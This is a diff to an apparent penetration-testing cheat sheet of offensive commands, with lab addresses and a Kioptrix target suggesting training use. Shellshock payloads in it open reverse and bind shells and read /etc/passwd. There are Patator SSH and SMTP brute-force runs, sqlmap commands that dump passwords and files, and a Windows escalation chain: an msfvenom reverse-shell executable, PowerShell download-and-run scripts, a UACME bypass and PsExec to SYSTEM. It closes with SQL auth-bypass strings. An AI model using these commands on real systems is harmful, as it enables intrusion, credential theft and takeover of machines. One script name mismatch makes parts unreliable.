@@ -101,9 +101,10 @@ find /var/log -type f -exec ls -la {} \; 2>/dev/null
 find / -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "authorized_hosts" -o -name "authorized_keys"      2>/dev/null |xargs -r ls -la
 
 
-# pty shell
-python -c 'import pty;pty.spawn("/bin/bash")'
 
+# pty shell
+
+python -c 'import pty;pty.spawn("/bin/bash")'
 
 
 # python\ruby\php HTTP servers
@@ -119,14 +120,14 @@ php -S 0.0.0.0:8888
 curl -H "User-agent: () { :; }; /bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1" http://<target>/cgi-bin/admin.cgi -v
 
 
-# moar shellshock 
+# more shellshock 
 
 	# A tool to find and exploit servers vulnerable to Shellshock
 	# https://github.com/nccgroup/shocker
 	$ ./shocker.py -H 192.168.56.118  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
 
 	# cat file
-	$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 172.16.236.141 80
+	$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\n Host:vulnerable\r\nConnection: close\r\n\r\n" | nc 172.16.236.141 80
 
 	# bind shell
 	$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 192.168.56.118 80
@@ -150,8 +151,22 @@ wget -qO- -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /usr/bi
 curl 10.11.1.71 -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
 
 
-# Dirb dir bruteforce
-dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt
+
+# Patator ssh login brute
+patator ssh_login host=192.168.0.18 user=FILE0 password=FILE1 0=word.txt 1=word.txt -x ignore:mesg='Authentication failed.'
+
+
+
+
+# Patator smtp_login example
+# git clone https://github.com/lanjelot/patator.git /usr/share/patator
+
+# SMTP bruteforce
+$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst
+$ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
+$ patator smtp_login host=192.168.17.129 helo='ehlo 192.168.17.128' user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
+$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep='incorrect password or account name'
+
 
 
 # scan something with netcat
@@ -397,6 +412,14 @@ sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --
 
 sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read="/var/www/blah.php"
 
+# some more examples
+
+./sqlmap.py -u "http://kioptrix3.com/gallery/gallery.php?id=1" -f -b --current-user --is-dba --dbs
+./sqlmap.py -u "http://kioptrix3.com/gallery/gallery.php?id=1" --columns
+./sqlmap.py -u "http://kioptrix3.com/gallery/gallery.php?id=1" --users --passwords
+./sqlmap.py -u "http://kioptrix3.com/gallery/gallery.php?id=1" --file-read="/etc/passwd"
+./sqlmap.py -u "http://kioptrix3.com/gallery/gallery.php?id=1" --dump
+
 
 
 
@@ -450,6 +473,52 @@ wce -w
 
 # dump hashes of other users with pwdump7
 http://www.heise.de/download/pwdump.html
+
+
+
+
+# GETSYSTEM with Admin reverse_shell on win7
+msfvenom –p windows/shell_reverse_tcp LHOST=192.168.56.102 –f exe > danger.exe
+
+#show account settings
+net user <login>
+
+# download psexec to kali
+https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx
+
+# upload psexec.exe file onto the victim machine with powershell script
+echo $client = New-Object System.Net.WebClient > script.ps1
+echo $targetlocation = "http://192.168.56.102/PsExec.exe" >> script.ps1
+echo $client.DownloadFile($targetlocation,"psexec.exe") >> script.ps1
+powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1
+
+# upload danger.exe file onto the victim machine with powershell script
+echo $client = New-Object System.Net.WebClient > script2.ps1
+echo $targetlocation = "http://192.168.56.102/danger.exe" >> script2.ps1
+echo $client.DownloadFile($targetlocation,"danger.exe") >> script2.ps1
+powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script2.ps1
+
+# UAC bypass from precompiled binaries:
+https://github.com/hfiref0x/UACME
+
+# upload https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe to victim pc with powershell
+echo $client = New-Object System.Net.WebClient > script2.ps1
+echo $targetlocation = "http://192.168.56.102/Akagi64.exe" >> script3.ps1
+echo $client.DownloadFile($targetlocation,"Akagi64.exe") >> script3.ps1
+powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script3.ps1
+
+# create listener on kali
+nc -lvp 4444
+
+# Use Akagi64 to run the danger.exe file with SYSTEM privileges
+Akagi64.exe 1 C:\Users\User\Desktop\danger.exe
+
+# create listener on kali
+nc -lvp 4444
+
+# The above step should give us a reverse shell with elevated privileges
+# Use PsExec to run the danger.exe file with SYSTEM privileges
+psexec.exe –i –d –accepteula –s danger.exe
 
 
 
@@ -603,7 +672,7 @@ Once the required values are completed the following command will execute your h
 
 
 
-#auth bypass stuff
+#auth bypass strings
 
 or 1=1
 or 1=1--
